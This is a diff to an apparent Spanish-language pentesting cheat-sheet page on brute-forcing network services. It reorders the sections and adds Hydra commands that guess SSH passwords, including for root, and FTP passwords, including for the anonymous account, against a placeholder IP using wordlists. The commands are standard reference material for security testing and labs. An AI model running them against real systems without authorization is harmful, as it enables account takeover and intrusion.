@@ -13,20 +13,23 @@ header:
 <h1>Fuerza bruta a servicios</h1>
 
 <h2><b>Hydra</b></h2>
-<div class="grid">
-  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP</div>
-</div>
 
-~~~bash
-hydra -l ftp -P wordlist.txt -v <IP> ftp -o ftp-creds.txt
-~~~
-
-<div class="grid">
+<div class="grid" id="ssh-brute">
   <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">SSH</div>
 </div>
 
 ~~~bash
 hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u <IP> ssh -o ssh-creds.txt
+hydra -l root -P passwords.txt -t 3 -s port <IP> ssh
+~~~
+
+<div class="grid" id="ftp-brute">
+  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP</div>
+</div>
+
+~~~bash
+hydra -l anonymous -P passwords.txt -v <IP> ftp -o ftp-creds.txt
+hydra -L users.txt -P passwords.txt -t 3 -s 21 <IP> ftp
 ~~~
 
 <div class="grid">
